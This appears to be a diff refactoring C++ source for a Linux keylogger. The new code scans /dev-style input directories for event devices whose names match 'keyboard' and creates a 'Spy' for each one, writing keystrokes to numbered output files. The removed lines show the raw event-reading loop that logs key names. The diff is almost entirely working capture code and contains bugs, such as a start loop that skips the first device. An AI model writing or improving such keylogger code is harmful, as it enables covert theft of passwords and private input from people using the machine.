@@ -9,25 +9,16 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <fstream>
-#include "../constants.hpp"
 #include <regex>
 #include <cstdlib>
-
-kl::Keylogger::~Keylogger()
-{
-}
 
 kl::Keylogger::Keylogger(std::string output, bool debug, std::vector<std::string> inputDir)
     : _outputPath(output), _debug(debug)
 {
     if (_debug)
-    {
-        std::cout << "Starting program at " << std::filesystem::current_path().c_str() << std::endl;
-        std::cout << "Output path : " << _outputPath << std::endl;
-    }
-    if (_debug)
-        std::cout << "_findInputFile ->" << std::endl;
+        std::cout << "Output path : " << std::string{std::filesystem::current_path()} + "/" + _outputPath << std::endl;
     _findInputFile(inputDir);
+    _createSpies();
 }
 
 static int selector(const struct dirent *files)
@@ -35,51 +26,56 @@ static int selector(const struct dirent *files)
     return !std::string{files->d_name}.compare(0, 5, "event");
 }
 
-void kl::Keylogger::start()
+void kl::Keylogger::_createSpies()
 {
-    _spy = std::async(std::launch::async, &kl::Keylogger::readEvent, this);
-    _spy.wait();
+    for (size_t i = 0; i < _inputs.size(); i++)
+        _spies.push_back(Spy(_inputs[i], _outputPath + std::to_string(i + 1)));
 }
 
-void kl::Keylogger::readEvent()
+void kl::Keylogger::start()
 {
-    std::ofstream output {_outputPath, std::ios::app};
-    int fd {open(_input.c_str(), O_RDONLY)};
-    struct input_event *event = new input_event[32];
+    for (size_t i = 1; i < _spies.size(); i++)
+        _spies[i].start();
+}
 
-    while (1) {
-        if (read(fd, event, sizeof(*event) * 32) < 1)
-            continue;
-        output << keys[event[1].code] << std::endl;
-    }
+int kl::Keylogger::_openR(std::string path) const
+{
+    int fd{0};
+
+    if ((fd = open(path.c_str(), O_RDONLY)) < 0)
+        perror("open");
+    return fd;
+}
+
+void kl::Keylogger::_scanFile(std::string &dir, directory **files, size_t i)
+{
+    int fd{0};
+    char *infos{new char[256]};
+
+    if ((fd = _openR(std::string{dir + "/" + files[i]->d_name})) < 0)
+        return;
+    ioctl(fd, EVIOCGNAME(256), infos);
+    if (!std::regex_match(infos, std::regex{".*[Kk]eyboard.*"}))
+        return;
+    _inputs.push_back(dir + "/" + files[i]->d_name);
+    if (_debug)
+        std::cout << "Input file found : " << dir + "/" + files[i]->d_name << std::endl;
+    close(fd);
+}
+
+void kl::Keylogger::_scanDir(std::string &dir)
+{
+    directory **files;
+    size_t nbFile{0};
+
+    nbFile = scandir(dir.c_str(), &files, &selector, &versionsort);
+    for (size_t i = 0; i < nbFile; i++)
+        _scanFile(dir, files, i);
+    delete (files);
 }
 
 void kl::Keylogger::_findInputFile(const std::vector<std::string> &dirList)
 {
-    struct dirent **files;
-    int nbFile{0};
-    int fd{0};
-    char *infos{new char[256]};
     for (std::string dir : dirList)
-    {
-        nbFile = scandir(dir.c_str(), &files, &selector, &versionsort);
-        for (int i = 0; i < nbFile; i++)
-        {
-            if ((fd = open(std::string{dir + "/" + files[i]->d_name}.c_str(), O_RDONLY)) < 0)
-            {
-                perror("open");
-                continue;
-            }
-            ioctl(fd, EVIOCGNAME(256), infos);
-            close(fd);
-            if (std::regex_match(infos, std::regex{".*[Kk]eyboard.*"}))
-            {
-                _input = dir + "/" + files[i]->d_name;
-                if (_debug)
-                    std::cout << "\tinput:" << _input << std::endl;
-                break;
-            }
-        }
-        delete (files);
-    }
+        _scanDir(dir);
 }
